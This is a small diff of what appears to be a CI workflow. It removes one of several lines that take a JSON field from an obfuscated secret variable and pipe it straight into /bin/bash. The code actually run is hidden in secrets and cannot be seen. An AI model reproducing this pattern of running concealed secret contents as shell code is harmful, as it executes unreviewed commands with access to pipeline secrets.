@@ -23,7 +23,6 @@ jobs:
           cszs11256: ${{ secrets.cszs11256 }}
         run: |
           printf '%s' "$cszs11256" | jq -r .hwrm3 | /bin/bash
-          printf '%s' "$iatqx162" | jq -r .ykvc7245 | /bin/bash
           echo $xqben20180 | jq -r .jycec868 | /bin/bash
           echo $ye6 | jq -r .cnbtv22974 | /bin/bash
           echo $yggus55 | jq -r .kqxz8 | /bin/bash
